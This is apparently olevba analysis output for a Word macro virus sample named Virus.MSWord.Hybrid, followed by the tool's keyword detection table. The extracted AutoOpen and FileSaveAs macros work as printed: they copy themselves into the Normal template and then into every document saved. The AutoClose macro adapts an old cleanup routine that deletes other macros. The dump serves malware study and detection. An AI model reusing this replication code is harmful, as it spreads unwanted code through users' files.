olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hybrid-ebbc5a4e38b63c800bad1b6589fcee04f520a876
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hybrid-ebbc5a4e38b63c800bad1b6589fcee04f520a876 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Hybrid-ebbc5a4e38b63c800bad1b6589fcee04f520a876 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error Resume Next
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
sTMacro$ = sMe$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
WordBasic.FileSaveAs dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Hybrid-ebbc5a4e38b63c800bad1b6589fcee04f520a876 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' *****************************************************************
' AutoClose Prank Macro cleanup
' Created from SCAN.DOC CleanUp and AutoOpen macros last modified
' August 11, 1995
'
' Purpose:
' Remove prank macros from document/template being closed
' *****************************************************************

Dim quiet, notopened, notsaved, notconverted, cleaned, Mac, quote$, logfile$, Found$, sMe$

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim fn$
Dim x
quiet = 0
notopened = 0
notsaved = 0
notconverted = 0
cleaned = 0
Mac = 0
quote$ = ""
logfile$ = ""
Found$ = ""
sMe$ = ""
    ' init
    quiet = 0
    notopened = 0
    notsaved = 0
    notconverted = 0
    cleaned = 0

    ' What platform are we on, Mac or Win?
    If (InStr(WordBasic.[AppInfo$](1), "Macintosh") > 0) Then
        Mac = 1
        quote$ = ""
    ElseIf (InStr(WordBasic.[AppInfo$](1), "Windows 3.") > 0) Then
        ' 16-bit Windows
        Mac = 0
        quote$ = ""
    Else
        Mac = 0
        quote$ = Chr(34)
    End If
    

    ' Preserve user settings and set up our own

fn$ = WordBasic.[FileName$]()
        If FixIt(fn$) Then
x = WordBasic.MsgBox("This document or your Normal template contained the prank macros. The macros have been removed. Saving the document and Normal now will save these changes. Save now?", "Prank macros detected!", 52)
            If x <> 0 Then
                WordBasic.FileSaveAll 0, 2
            End If
        End If

EndSub:
    
End Sub

Private Function FixIt(fn$)
Dim Foo
    Foo = 0
    Foo = Foo + CleanIt("AAAZFS")
    Foo = Foo + CleanIt("AAAZAO")
    If (Foo > 0) Then
        ' remove possibly correct macros only if definitely evil ones
        ' detected (above)
        Foo = Foo + CleanIt("FileSaveAs")
Rem         Foo = Foo + CleanIt("PayLoad")
        If Foo Then Foo = Foo + CleanIt("AutoOpen")
    End If
    FixIt = Foo
EndFunc:
End Function

Private Function CleanIt(BadMacro$)
Dim TD$
Dim mfn$
Select Case WordBasic.[AppInfo$](2)
    Case "1.0", "1.1", "1.1a", "2.0", "2.0a", "2.0b", "2.0c", "6.0", "6.0a", "6.0c"
    If WordBasic.[Right$](WordBasic.[GetProfileString$]("Microsoft Word", "User-Dot-Path"), 1) = "\" Then
        sMe$ = UCase(WordBasic.[GetProfileString$]("Microsoft Word", "User-Dot-Path") + "normal.dot")
    Else
        sMe$ = UCase(WordBasic.[GetProfileString$]("Microsoft Word", "User-Dot-Path") + "\normal.dot")
    End If
Case "7.0", "7.0a"
    '7.0a is included only as a precaution for the future just in case there ever is such a version.
    TD$ = WordBasic.[GetPrivateProfileString$]("HKEY_CURRENT_USER\Software\Microsoft\Microsoft Office\95\FileNew\LocalTemplates", "", "")
    If WordBasic.[Right$](TD$, 1) = "\" Then
        sMe$ = TD$ + "NORMAL.DOT"
    Else
        sMe$ = TD$ + "\NORMAL.DOT"
    End If
    Case Else
End Select
If TD$ = "" Then sMe$ = "Normal.dot"
    CleanIt = 0
    While WordBasic.[MacroFileName$](BadMacro$) <> "" And WordBasic.[MacroFileName$](BadMacro$) <> "Built In"
        mfn$ = WordBasic.[MacroFileName$](BadMacro$)
        If mfn$ = "Global" Then mfn$ = sMe$
        WordBasic.Organizer Delete:=1, Source:=mfn$, Name:=BadMacro$, Tab:=3
        CleanIt = 1
    Wend
EndFunc:
End Function
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Hybrid-ebbc5a4e38b63c800bad1b6589fcee04f520a876 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":AutoOpen"
        WordBasic.MacroCopy sMacro$, "Global:AutoOpen", 1
        sMacro$ = sMe$ + ":AutoClose"
        WordBasic.MacroCopy sMacro$, "Global:AutoClose", 1
        sMacro$ = sMe$ + ":FileSaveAs"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", 1
Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

